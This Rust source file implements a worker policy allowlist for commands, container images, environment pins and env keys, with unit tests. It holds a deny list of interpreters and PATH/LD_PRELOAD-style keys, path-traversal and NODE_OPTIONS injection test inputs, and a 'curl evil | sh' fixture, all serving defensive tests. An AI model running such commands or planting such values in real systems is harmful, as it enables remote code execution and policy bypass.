//! Worker command policy: an optional allowlist a worker enforces on the jobs and environments
//! it accepts. Without a policy file a worker runs everything, exactly as before; with one, each
//! listed category is restricted and each omitted category stays unrestricted.

use crate::model::{Environment, JobSpec};
use anyhow::{Context, Result, bail};
use serde::{Deserialize, Serialize};
use sha2::{Digest, Sha256};
use std::path::Path;

/// Keys that let a job redirect or inject code into an allowed program; a policy can allow them
/// only through `"*"`, never by name or prefix.
const DANGEROUS_ENV: [&str; 3] = ["PATH", "LD_", "DYLD_"];
/// Programs that run whatever code their arguments name, so allowing them allows everything.
const INTERPRETERS: [&str; 15] = [
    "sh", "bash", "zsh", "dash", "fish", "ksh", "python", "node", "deno", "bun", "ruby", "perl",
    "pwsh", "powershell", "cmd",
];

/// A pinned environment: `id` exact or ending in `*`; `sha256` the content digest or `"*"`.
#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct EnvironmentRule {
    pub id: String,
    pub sha256: String,
}

/// The effective policy. This is also what a worker advertises to the Hub, so it stays lenient
/// about unknown fields; the file itself is parsed strictly by [`Policy::load`].
#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
pub struct Policy {
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub commands: Option<Vec<Vec<String>>>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub containers: Option<Vec<String>>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub environments: Option<Vec<EnvironmentRule>>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub env: Option<Vec<String>>,
    #[serde(default = "yes")]
    pub self_update: bool,
    /// Known ways around the restrictions this policy leaves open; informational.
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub warnings: Vec<String>,
}
fn yes() -> bool {
    true
}

#[derive(Deserialize)]
#[serde(deny_unknown_fields)]
struct PolicyFile {
    version: u32,
    commands: Option<Vec<Vec<String>>>,
    containers: Option<Vec<String>>,
    environments: Option<Vec<EnvironmentRule>>,
    env: Option<Vec<String>>,
    self_update: Option<bool>,
}

/// SHA-256 of an environment's content, ignoring its revision label. The worker computes it from
/// the definition it actually received, so a pin breaks whenever the recipe changes.
pub fn environment_digest(environment: &Environment) -> String {
    let mut unrevised = environment.clone();
    unrevised.revision.clear();
    let json = serde_json::to_string(&unrevised).expect("environments serialize");
    hex::encode(Sha256::digest(json.as_bytes()))
}

/// Any component Windows could normalize to `..`: two or more dots, possibly followed by more
/// dots or spaces, which Win32 path handling trims.
fn has_parent_component(value: &str) -> bool {
    value
        .split(['/', '\\'])
        .any(|part| part.starts_with("..") && part.trim_end_matches(['.', ' ']).is_empty())
}
/// `"*"` matches anything; a trailing `*` matches a string prefix, except across `..`;
/// anything else matches exactly.
fn pattern_matches(pattern: &str, value: &str) -> bool {
    if pattern == "*" {
        return true;
    }
    match pattern.strip_suffix('*') {
        Some(prefix) => value.starts_with(prefix) && !has_parent_component(value),
        None => pattern == value,
    }
}
fn check_pattern(pattern: &str, what: &str) -> Result<()> {
    if pattern.is_empty() {
        bail!("{what}: empty pattern")
    }
    if pattern.trim_end_matches('*').contains('*') || pattern.ends_with("**") {
        bail!("{what}: '*' is allowed only alone or once at the end, got {pattern:?}")
    }
    Ok(())
}
fn dangerous_env(key: &str) -> bool {
    let upper = key.to_ascii_uppercase();
    upper == "PATH" || DANGEROUS_ENV[1..].iter().any(|prefix| upper.starts_with(prefix))
}
fn program_name(argv0: &str) -> String {
    let name = argv0.rsplit(['/', '\\']).next().unwrap_or(argv0).to_ascii_lowercase();
    name.strip_suffix(".exe").unwrap_or(&name).to_string()
}
fn is_interpreter(argv0: &str) -> bool {
    let name = program_name(argv0);
    let base = name.trim_end_matches(|c: char| c.is_ascii_digit() || c == '.');
    INTERPRETERS.contains(&base) || argv0 == "*"
}
fn describe(values: &[String]) -> String {
    let text = serde_json::to_string(values).unwrap_or_default();
    if text.len() > 160 {
        format!("{}…]", &text[..text.floor_char_boundary(156)])
    } else {
        text
    }
}
fn unrestricted<T>(list: &Option<Vec<T>>, wildcard: impl Fn(&T) -> bool) -> bool {
    list.as_ref().is_none_or(|items| items.iter().any(wildcard))
}

impl Policy {
    /// Reads and validates a policy file. Typos, `null` categories and patterns with `*` in the
    /// middle are errors; an omitted category is unrestricted and `[]` denies the category.
    pub fn load(path: &Path) -> Result<Self> {
        check_permissions(path)?;
        let text = std::fs::read_to_string(path)
            .with_context(|| format!("read policy file {}", path.display()))?;
        Self::parse(&text).with_context(|| format!("invalid policy file {}", path.display()))
    }
    pub fn parse(text: &str) -> Result<Self> {
        let value: yaml_serde::Value = yaml_serde::from_str(text)?;
        let mapping = value.as_mapping().context("policy must be a YAML mapping")?;
        for (key, value) in mapping {
            if value.is_null() {
                bail!(
                    "{} is empty; omit it to leave it unrestricted or write [] to deny it",
                    key.as_str().unwrap_or("a field")
                )
            }
        }
        let file: PolicyFile = yaml_serde::from_value(value)?;
        if file.version != 1 {
            bail!("unsupported policy version {}; this worker understands version 1", file.version)
        }
        let mut policy = Policy {
            commands: file.commands,
            containers: file.containers,
            environments: file.environments,
            env: file.env,
            self_update: file.self_update.unwrap_or(true),
            warnings: vec![],
        };
        policy.validate()?;
        policy.warnings = policy.bypasses();
        Ok(policy)
    }
    fn validate(&self) -> Result<()> {
        for rule in self.commands.iter().flatten() {
            if rule.is_empty() {
                bail!("commands: empty rule")
            }
            for element in rule {
                check_pattern(element, "commands")?;
            }
        }
        for pattern in self.containers.iter().flatten() {
            check_pattern(pattern, "containers")?;
        }
        for rule in self.environments.iter().flatten() {
            check_pattern(&rule.id, "environments.id")?;
            if rule.sha256 != "*"
                && (rule.sha256.len() != 64
                    || !rule.sha256.bytes().all(|b| b.is_ascii_digit() || (b'a'..=b'f').contains(&b)))
            {
                bail!("environments.sha256 must be 64 lowercase hex characters or \"*\", got {:?}", rule.sha256)
            }
        }
        for key in self.env.iter().flatten() {
            check_pattern(key, "env")?;
            if key == "*" {
                continue;
            }
            let stem = key.trim_end_matches('*').to_ascii_uppercase();
            let reaches = dangerous_env(&stem)
                || (key.ends_with('*') && ["PATH", "LD_", "DYLD_"].iter().any(|d| d.starts_with(&stem)));
            if reaches {
                bail!("env: {key} would allow PATH, LD_* or DYLD_*, which redirect allowed commands; only \"*\" can allow those")
            }
        }
        Ok(())
    }
    /// Known ways around the configured restrictions; shown at startup, by `ylcc policy check`
    /// and in the dashboard so a restricted worker is never mistaken for a sandbox.
    pub fn bypasses(&self) -> Vec<String> {
        let mut warnings = vec![];
        let commands_restricted = !unrestricted(&self.commands, |rule| rule.len() == 1 && rule[0] == "*");
        if commands_restricted {
            if unrestricted(&self.env, |key| key == "*") {
                warnings.push("env is unrestricted: a job can set PATH or LD_PRELOAD and run its own program under an allowed name".into());
            }
            if unrestricted(&self.environments, |rule| rule.sha256 == "*") {
                warnings.push("environments are not pinned by sha256: any requester can register setup scripts that run on this worker".into());
            }
            if unrestricted(&self.containers, |pattern| pattern == "*") {
                warnings.push("containers are unrestricted: a job can pick an image that provides an allowed command name".into());
            }
            for rule in self.commands.iter().flatten() {
                if is_interpreter(&rule[0]) {
                    warnings.push(format!("command rule {} starts an interpreter, which can run any code", describe(rule)));
                }
            }
        }
        for pattern in self.containers.iter().flatten() {
            if let Some(prefix) = pattern.strip_suffix('*')
                && !prefix.is_empty()
                && !prefix.ends_with(['/', ':', '@'])
            {
                warnings.push(format!("container pattern {pattern:?} also matches other repositories; end the prefix at '/', ':' or '@'"));
            }
        }
        warnings
    }
    /// One line per category: unrestricted, wildcard, deny-all or restricted.
    pub fn summary(&self) -> serde_json::Value {
        fn state<T>(list: &Option<Vec<T>>, wildcard: impl Fn(&T) -> bool) -> &'static str {
            match list {
                None => "unrestricted (omitted)",
                Some(items) if items.is_empty() => "deny all ([])",
                Some(items) if items.iter().any(wildcard) => "unrestricted (\"*\")",
                Some(_) => "restricted",
            }
        }
        serde_json::json!({
            "commands": state(&self.commands, |rule| rule.len() == 1 && rule[0] == "*"),
            "containers": state(&self.containers, |pattern| pattern == "*"),
            "environments": state(&self.environments, |rule| rule.id == "*" && rule.sha256 == "*"),
            "env": state(&self.env, |key| key == "*"),
            "self_update": self.self_update,
        })
    }
    fn command_allowed(&self, command: &[String]) -> bool {
        let Some(rules) = &self.commands else { return true };
        rules.iter().any(|rule| {
            (rule.len() == 1 && rule[0] == "*")
                || (rule.len() <= command.len()
                    && rule.iter().zip(command).all(|(pattern, value)| pattern_matches(pattern, value)))
        })
    }
    fn image_allowed(&self, image: &str) -> bool {
        self.containers
            .as_ref()
            .is_none_or(|patterns| patterns.iter().any(|pattern| pattern_matches(pattern, image)))
    }
    fn env_allowed(&self, key: &str) -> bool {
        self.env.as_ref().is_none_or(|patterns| {
            patterns
                .iter()
                .any(|pattern| pattern == "*" || (!dangerous_env(key) && pattern_matches(pattern, key)))
        })
    }
    /// Checks an environment's setup and image; used for jobs, explicit preparation and the
    /// startup check of environments prepared before the policy existed.
    pub fn check_environment(&self, environment: &Environment) -> Result<(), String> {
        if let Some(rules) = &self.environments {
            let digest = environment_digest(environment);
            if !rules
                .iter()
                .any(|rule| pattern_matches(&rule.id, &environment.id) && (rule.sha256 == "*" || rule.sha256 == digest))
            {
                return Err(format!(
                    "environment {} (sha256 {digest}) is not allowed by worker policy; to allow it add {{id: {}, sha256: {digest}}} to environments",
                    environment.id, environment.id
                ));
            }
        }
        if let Some(image) = &environment.image
            && !self.image_allowed(image)
        {
            return Err(format!("container image {image} is not allowed by worker policy"));
        }
        Ok(())
    }
    /// Checks a job and the environment the Hub sent with it. An empty command (the Hub's
    /// environment-only preparation check) skips the command, image and env-key rules.
    pub fn check_job(&self, spec: &JobSpec, environment: Option<&Environment>) -> Result<(), String> {
        if let Some(id) = &spec.environment {
            let Some(environment) = environment.filter(|environment| &environment.id == id) else {
                return Err(format!("environment {id} was not provided with the job"));
            };
            self.check_environment(environment)?;
        } else if let Some(environment) = environment {
            self.check_environment(environment)?;
        }
        if spec.command.is_empty() {
            return Ok(());
        }
        if !self.command_allowed(&spec.command) {
            return Err(format!("command {} is not allowed by worker policy", describe(&spec.command)));
        }
        let image = spec
            .container
            .as_ref()
            .or(environment.and_then(|environment| environment.image.as_ref()));
        if let Some(image) = image
            && !self.image_allowed(image)
        {
            return Err(format!("container image {image} is not allowed by worker policy"));
        }
        if let Some(key) = spec.env.keys().find(|key| !self.env_allowed(key)) {
            return Err(format!("job environment variable {key} is not allowed by worker policy"));
        }
        Ok(())
    }
}

/// Builds a ready-to-paste policy that allows exactly these jobs and environments. Every
/// category is listed (`[]` when unused) so nothing is left unrestricted by omission. Returns the
/// YAML and notes for the operator.
pub fn suggest(specs: &[JobSpec], environments: &[Environment]) -> (String, Vec<String>) {
    let mut notes = vec![];
    let mut commands: Vec<&Vec<String>> = vec![];
    let mut containers: Vec<&String> = vec![];
    let mut keys: Vec<&String> = vec![];
    for spec in specs {
        if !commands.contains(&&spec.command) {
            commands.push(&spec.command);
            if spec.command.first().is_some_and(|argv0| is_interpreter(argv0)) {
                notes.push(format!(
                    "{} starts an interpreter; allowing it allows any code (prefer a script file or a fixed tool command)",
                    describe(&spec.command)
                ));
            }
        }
        for key in spec.env.keys() {
            if dangerous_env(key) {
                notes.push(format!("job env key {key} left out: it would let jobs redirect allowed commands"));
            } else if !keys.contains(&key) {
                keys.push(key);
            }
        }
        if let Some(image) = &spec.container
            && !containers.contains(&image)
        {
            containers.push(image);
        }
    }
    for environment in environments {
        if let Some(image) = &environment.image
            && !containers.contains(&image)
        {
            containers.push(image);
        }
    }
    let mut yaml = String::from("version: 1\n");
    yaml.push_str(&format!("commands:{}\n", block(commands.iter().map(|c| json(c)))));
    yaml.push_str(&format!("containers:{}\n", block(containers.iter().map(|c| json(c)))));
    yaml.push_str(&format!(
        "environments:{}\n",
        block(environments.iter().map(|e| format!(
            "{{id: {}, sha256: {}}}",
            json(&e.id),
            environment_digest(e)
        )))
    ));
    yaml.push_str(&format!("env:{}\n", block(keys.iter().map(|k| json(k)))));
    yaml.push_str("self_update: false\n");
    (yaml, notes)
}
fn block(items: impl Iterator<Item = String>) -> String {
    let items: Vec<String> = items.collect();
    if items.is_empty() {
        " []".into()
    } else {
        items.iter().map(|item| format!("\n  - {item}")).collect()
    }
}
/// JSON is valid YAML flow syntax and quotes anything YAML would reinterpret.
fn json<T: Serialize + ?Sized>(value: &T) -> String {
    serde_json::to_string(value).expect("plain values serialize")
}

/// A policy the worker account could rewrite would let a job lift it before the next restart.
#[cfg(unix)]
fn check_permissions(path: &Path) -> Result<()> {
    use std::os::unix::fs::{MetadataExt, PermissionsExt};
    let canonical = std::fs::canonicalize(path)
        .with_context(|| format!("policy file {} not found", path.display()))?;
    let parent = canonical.parent().context("policy file needs a parent directory")?;
    for (what, target) in [("policy file", canonical.as_path()), ("policy directory", parent)] {
        let metadata = std::fs::metadata(target)?;
        if metadata.permissions().mode() & 0o022 != 0 {
            bail!("{what} {} is group- or world-writable; run chmod go-w on it", target.display())
        }
        if metadata.uid() == unsafe { libc::geteuid() } && unsafe { libc::geteuid() } != 0 {
            eprintln!(
                "warning: {what} {} is owned by the worker's own account, so a job could change it before the next restart; prefer a file owned by root or an administrator",
                target.display()
            );
        }
    }
    Ok(())
}
#[cfg(not(unix))]
fn check_permissions(path: &Path) -> Result<()> {
    // Windows ACLs are not inspected; the docs ask for an administrator-owned file.
    std::fs::metadata(path).with_context(|| format!("policy file {} not found", path.display()))?;
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::collections::BTreeMap;

    fn job(command: &[&str]) -> JobSpec {
        JobSpec {
            command: command.iter().map(|s| s.to_string()).collect(),
            ..Default::default()
        }
    }
    fn environment() -> Environment {
        Environment {
            id: "rust-1.96.0".into(),
            revision: "abc".into(),
            setup: vec!["install".into()],
            ..Default::default()
        }
    }

    #[test]
    fn parsing_is_strict_about_typos_versions_nulls_and_patterns() {
        assert!(Policy::parse("version: 1\n").is_ok());
        assert!(Policy::parse("version: 2\n").unwrap_err().to_string().contains("version 2"));
        assert!(Policy::parse("version: 1\nenviroments: []\n").is_err());
        let blank = Policy::parse("version: 1\nenv:\n").unwrap_err();
        assert!(blank.to_string().contains("env is empty"), "{blank}");
        assert!(Policy::parse("version: 1\ncommands: [[\"car*go\"]]\n").is_err());
        assert!(Policy::parse("version: 1\ncommands: [[]]\n").is_err());
        assert!(Policy::parse("version: 1\nenv: [PATH]\n").is_err());
        assert!(Policy::parse("version: 1\nenv: [Path]\n").is_err());
        assert!(Policy::parse("version: 1\nenv: [ld_preload]\n").is_err());
        assert!(Policy::parse("version: 1\nenv: [\"L*\"]\n").is_err());
        assert!(Policy::parse("version: 1\nenv: [\"*\"]\n").is_ok());
        assert!(Policy::parse("version: 1\nenvironments: [{id: x, sha256: ABC}]\n").is_err());
        assert!(Policy::parse("version: 1\nself_update: false\n").is_ok_and(|p| !p.self_update));
    }

    #[test]
    fn omitted_categories_allow_everything_and_empty_lists_deny() {
        let open = Policy::parse("version: 1\n").unwrap();
        let mut spec = job(&["anything", "--at-all"]);
        spec.container = Some("docker.io/library/alpine:3".into());
        spec.env = BTreeMap::from([("PATH".into(), "/tmp".into())]);
        assert!(open.check_job(&spec, None).is_ok());
        assert!(open.warnings.is_empty());
        let closed = Policy::parse("version: 1\ncommands: []\n").unwrap();
        assert!(closed.check_job(&job(&["true"]), None).is_err());
        assert_eq!(closed.summary()["commands"], "deny all ([])");
        assert_eq!(closed.summary()["env"], "unrestricted (omitted)");
    }

    #[test]
    fn command_rules_match_argv_prefixes_and_wildcards() {
        let policy = Policy::parse("version: 1\ncommands: [[cargo, build], [\"/opt/tools/*\"], [make, \"test-*\"]]\n").unwrap();
        assert!(policy.check_job(&job(&["cargo", "build", "--release"]), None).is_ok());
        assert!(policy.check_job(&job(&["cargo", "test"]), None).is_err());
        assert!(policy.check_job(&job(&["/usr/bin/cargo", "build"]), None).is_err());
        assert!(policy.check_job(&job(&["cargo"]), None).is_err());
        assert!(policy.check_job(&job(&["/opt/tools/lint", "x"]), None).is_ok());
        assert!(policy.check_job(&job(&["/opt/tools/../../bin/sh"]), None).is_err());
        assert!(policy.check_job(&job(&["/opt/tools/..\\..\\bin\\sh"]), None).is_err());
        assert!(policy.check_job(&job(&["/opt/tools/.. /... /bin/sh"]), None).is_err());
        assert!(policy.check_job(&job(&["/opt/tools/..lint"]), None).is_ok());
        assert!(policy.check_job(&job(&["make", "test-unit"]), None).is_ok());
        let any = Policy::parse("version: 1\ncommands: [[\"*\"]]\n").unwrap();
        assert!(any.check_job(&job(&["whatever"]), None).is_ok());
    }

    #[test]
    fn images_env_keys_and_environment_pins_are_enforced() {
        let env = environment();
        let digest = environment_digest(&env);
        let policy = Policy::parse(&format!(
            "version: 1\ncommands: [[\"*\"]]\ncontainers: [\"ghcr.io/me/\"]\nenv: [RUST_LOG, \"CARGO_TERM_*\"]\nenvironments: [{{id: rust-1.96.0, sha256: {digest}}}, {{id: \"node-*\", sha256: \"*\"}}]\n"
        ))
        .unwrap();
        let mut spec = job(&["cargo"]);
        spec.container = Some("ghcr.io/me/app:1".into());
        assert!(policy.check_job(&spec, None).unwrap_err().contains("image"));
        let policy = Policy::parse(&format!(
            "version: 1\ncontainers: [\"ghcr.io/me/*\"]\nenv: [RUST_LOG, \"CARGO_TERM_*\"]\nenvironments: [{{id: rust-1.96.0, sha256: {digest}}}, {{id: \"node-*\", sha256: \"*\"}}]\n"
        ))
        .unwrap();
        assert!(policy.check_job(&spec, None).is_ok());
        spec.container = Some("ghcr.io/me/../evil".into());
        assert!(policy.check_job(&spec, None).is_err());
        spec.container = None;
        spec.env = BTreeMap::from([("RUST_LOG".into(), "1".into()), ("CARGO_TERM_COLOR".into(), "x".into())]);
        assert!(policy.check_job(&spec, None).is_ok());
        spec.env.insert("NODE_OPTIONS".into(), "--require x".into());
        assert!(policy.check_job(&spec, None).unwrap_err().contains("NODE_OPTIONS"));
        spec.env.clear();

        spec.environment = Some(env.id.clone());
        assert!(policy.check_job(&spec, None).unwrap_err().contains("not provided"));
        assert!(policy.check_job(&spec, Some(&env)).is_ok());
        let mut changed = env.clone();
        changed.setup = vec!["curl evil | sh".into()];
        let error = policy.check_job(&spec, Some(&changed)).unwrap_err();
        assert!(error.contains(&environment_digest(&changed)) && error.contains("rust-1.96.0"), "{error}");
        // The revision label is not part of the pin; the content is.
        let mut relabelled = env.clone();
        relabelled.revision = "other".into();
        assert!(policy.check_job(&spec, Some(&relabelled)).is_ok());
        let node = Environment { id: "node-22".into(), ..environment() };
        assert!(policy.check_environment(&node).is_ok());
        // The Hub's preparation check sends an empty command: only the environment is checked.
        assert!(policy.check_job(&JobSpec::default(), Some(&env)).is_ok());
        assert!(policy.check_job(&JobSpec::default(), Some(&changed)).is_err());
    }

    #[test]
    fn digest_format_is_stable() {
        // Changing how environments serialize silently invalidates every pin; update docs if so.
        // Canonical form: {"id":"rust-1.96.0","revision":"","requirements":{},"setup":["install"],
        // "verify":[],"image":null,"env":{}}
        assert_eq!(
            environment_digest(&environment()),
            "5b3e97234ea2fb92ef366aa2014ba4f741601b81dd23959de8fe808039d29917"
        );
    }

    #[test]
    fn bypasses_are_reported_without_failing() {
        let loose = Policy::parse("version: 1\ncommands: [[cargo, build], [python3, -c]]\ncontainers: [\"ghcr.io/me*\"]\n").unwrap();
        let text = loose.warnings.join("\n");
        assert!(text.contains("env is unrestricted"), "{text}");
        assert!(text.contains("not pinned"));
        assert!(text.contains("interpreter"));
        assert!(text.contains("also matches other repositories"));
        let tight = Policy::parse(&format!(
            "version: 1\ncommands: [[cargo, build]]\ncontainers: []\nenv: []\nenvironments: [{{id: x, sha256: {}}}]\n",
            "a".repeat(64)
        ))
        .unwrap();
        assert!(tight.warnings.is_empty(), "{:?}", tight.warnings);
    }

    #[test]
    fn suggestions_list_every_category_and_accept_their_own_jobs() {
        let env = environment();
        let mut build = job(&["cargo", "build", "--locked"]);
        build.environment = Some(env.id.clone());
        build.env = BTreeMap::from([("RUST_LOG".into(), "1".into()), ("PATH".into(), "/x".into())]);
        let (yaml, notes) = suggest(&[build.clone(), job(&["make", "check"])], std::slice::from_ref(&env));
        let policy = Policy::parse(&yaml).unwrap();
        assert!(policy.warnings.is_empty(), "{:?}\n{yaml}", policy.warnings);
        assert_eq!(policy.containers, Some(vec![]));
        assert!(!policy.self_update);
        build.env.remove("PATH");
        assert!(policy.check_job(&build, Some(&env)).is_ok(), "{yaml}");
        assert!(policy.check_job(&job(&["make", "check", "-j8"]), None).is_ok());
        assert!(policy.check_job(&job(&["cargo", "test"]), None).is_err());
        assert!(notes.iter().any(|note| note.contains("PATH")));
        let (_, notes) = suggest(&[job(&["sh", "-c", "make"])], &[]);
        assert!(notes[0].contains("interpreter"));
    }
    #[test]
    fn wire_form_ignores_unknown_fields() {
        let policy: Policy = serde_json::from_str(r#"{"commands":[["x"]],"future":true}"#).unwrap();
        assert!(policy.self_update);
        assert!(policy.check_job(&job(&["y"]), None).is_err());
    }
}
